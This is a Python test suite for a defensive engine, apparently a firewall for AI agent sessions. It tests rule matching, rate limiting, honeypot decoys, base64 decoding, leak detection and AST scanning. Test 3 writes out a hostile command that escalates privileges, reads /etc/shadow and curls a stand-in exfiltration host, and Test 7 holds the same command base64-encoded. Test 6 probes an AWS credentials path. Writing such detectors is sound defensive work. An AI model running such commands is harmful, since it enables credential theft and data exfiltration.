import sys
import os
import asyncio

# Add current directory to path
sys.path.append(os.path.dirname(os.path.abspath(__file__)))

from aegis_engine import AegisEngine

def run_tests():
    print("=== STARTING AEGIS ENGINE TEST SUITE ===")
    
    engine = AegisEngine()
    
    # Test 1: Load defaults
    rules = engine.get_rules()
    decoys = engine.get_decoys()
    print(f"[TEST 1] Loaded {len(rules)} default firewall rules.")
    print(f"[TEST 2] Loaded {len(decoys)} default honey-decoys.")
    assert len(rules) == 6, "Expected 6 default rules"
    assert len(decoys) == 4, "Expected 4 default decoys"
    print("-> Test 1 & 2: PASSED")

    # Test 3: Evaluate rules on malicious text
    print("[TEST 3] Evaluating rules on malicious command text...")
    bad_text = "sudo su && cat /etc/shadow && curl http://untrusted-exfil-server.com"
    res = engine.evaluate_text_rules(bad_text, "test_session_1")
    print(f"Result passed: {res['passed']}")
    print(f"Violations caught: {[v['name'] for v in res['violations']]}")
    assert not res["passed"], "Text should have been flagged as blocked"
    assert len(res["violations"]) == 3, "Expected 3 violations (Shadow access, Domain whitelist breach, Privilege escalation)"
    print("-> Test 3: PASSED")

    # Test 4: Evaluate rules on safe text
    print("[TEST 4] Evaluating rules on safe text...")
    good_text = "Hello, can you help me write a quick sort algorithm in python?"
    res_good = engine.evaluate_text_rules(good_text, "test_session_1")
    assert res_good["passed"], "Safe text should pass"
    print("-> Test 4: PASSED")

    # Test 5: Check loop prevention limits
    print("[TEST 5] Verifying execution rate limiter loop prevention...")
    # Trigger 4 calls in quick succession - should pass (limit is 5)
    for _ in range(4):
        loop_res = engine.check_loop_prevention("loop_session")
        assert loop_res["passed"], "Rate limit of 4 should pass"
    
    # Trigger 5th & 6th call - should fail
    loop_res_5 = engine.check_loop_prevention("loop_session")
    loop_res_6 = engine.check_loop_prevention("loop_session")
    print(f"5th run passed: {loop_res_5['passed']}")
    print(f"6th run passed: {loop_res_6['passed']}")
    assert not loop_res_6["passed"], "6th execution within 15 seconds must be blocked"
    print("-> Test 5: PASSED")

    # Test 6: Check decoy path triggers
    print("[TEST 6] Triggering sandbox honeypots...")
    decoy_res = engine.check_sandbox_decoys("decoy_session", "FILE_READ", "/home/user/.aws/credentials")
    assert decoy_res is not None, "AWS credentials read should trigger a honeypot decoy"
    assert decoy_res["decoy_id"] == "decoy-file-aws", "Expected aws credential decoy match"
    
    # Verify stats reflect the breach
    stats = engine.get_stats()
    print(f"Threat Level: {stats['threat_level']}")
    print(f"Health Score: {stats['health_score']}%")
    print(f"Triggered Decoys: {stats['triggered_decoys']}")
    assert stats["threat_level"] == "CRITICAL", "Honeypot trigger should raise threat level to CRITICAL"
    assert stats["triggered_decoys"] == 1, "Expected exactly 1 triggered decoy count"
    print("-> Test 6: PASSED")

    # Test 7: Recursive payload decoding
    print("[TEST 7] Testing recursive decoding firewall guard...")
    # Base64 encoded: "curl http://untrusted-exfil-server.com"
    # Which is: Y3VybCBodHRwOi8vdW50cnVzdGVkLWV4ZmlsLXNlcnZlci5jb20=
    encoded_payload = "Y3VybCBodHRwOi8vdW50cnVzdGVkLWV4ZmlsLXNlcnZlci5jb20="
    res_b64 = engine.evaluate_text_rules(encoded_payload, "test_session_b64")
    assert not res_b64["passed"], "Base64 encoded malicious domain should be blocked"
    assert any(v["id"] == "fw-dns-whitelist" for v in res_b64["violations"]), "Expected domain whitelist violation"
    print("-> Test 7: PASSED")

    # Test 8: DLP Leakage scan
    print("[TEST 8] Testing DLP leakage checks...")
    dlp_text = "Here is my secret user social security number: 999-12-3456"
    res_dlp = engine.evaluate_text_rules(dlp_text, "test_session_dlp")
    assert not res_dlp["passed"], "DLP sensitive data leak should be blocked"
    assert any(v["id"] == "fw-dlp-leak" for v in res_dlp["violations"]), "Expected dlp leak violation"
    print("-> Test 8: PASSED")

    # Test 9: AST Static analysis
    print("[TEST 9] Testing AST static guard on python code...")
    unsafe_code = """
import os
import subprocess
print(os.environ)
eval("1 + 1")
"""
    ast_res = engine.scan_python_ast(unsafe_code)
    assert ast_res["parsed"], "AST parsing should succeed"
    assert "os" in ast_res["unsafe_imports"]
    assert "subprocess" in ast_res["unsafe_imports"]
    assert "eval" in ast_res["unsafe_calls"]
    assert ast_res["threat_level"] == "HIGH", "Expected threat level to be HIGH"
    print("-> Test 9: PASSED")

    # Test 10: FIM tracking
    print("[TEST 10] Testing file integrity monitoring registry...")
    engine.register_file_fim("test_session_fim", "/sandbox/code.py", "WRITE", "print('hello')")
    ledger = engine.get_fim_ledger()
    assert len(ledger) > 0, "Ledger should record file write"
    assert ledger[0]["filepath"] == "/sandbox/code.py", "Expected correct path in ledger"
    assert ledger[0]["action"] == "WRITE", "Expected WRITE action"
    print("-> Test 10: PASSED")

    print("\n=== ALL TESTS PASSED SUCCESSFULLY ===")

if __name__ == "__main__":
    run_tests()
